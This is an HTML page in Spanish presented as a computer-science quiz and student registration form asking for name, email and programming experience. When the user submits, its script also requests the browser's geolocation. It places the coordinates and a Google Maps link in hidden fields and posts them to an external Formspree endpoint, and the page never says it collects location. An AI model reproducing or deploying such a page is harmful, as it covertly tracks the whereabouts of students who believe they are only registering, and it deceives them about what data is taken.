<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cuestionario de Informática</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        input, select, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box; }
        button { background-color: #1a73e8; color: white; font-weight: bold; cursor: pointer; border: none; }
    </style>
</head>
<body>
<div class="card">
    <h2>Registro de Alumnos</h2>
    <form id="f" action="https://formspree.io/f/xykngrnp" method="POST">
        <input type="text" name="nombre" placeholder="Nombre" required>
        <input type="email" name="email" placeholder="Correo" required>
        <select name="sabe_progra">
            <option value="si">Sí sabe</option>
            <option value="no">No sabe</option>
        </select>
        <input type="hidden" name="Latitud" id="lat">
        <input type="hidden" name="Longitud" id="lon">
        <input type="hidden" name="Mapa" id="map">
        <button type="button" onclick="enviar()">Enviar Registro</button>
    </form>
</div>
<script>
    function enviar() {
        const form = document.getElementById('f');
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                document.getElementById('lat').value = p.coords.latitude;
                document.getElementById('lon').value = p.coords.longitude;
                document.getElementById('map').value = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                form.submit();
            }, function() { form.submit(); });
        } else { form.submit(); }
    }
</script>
</body>
</html>
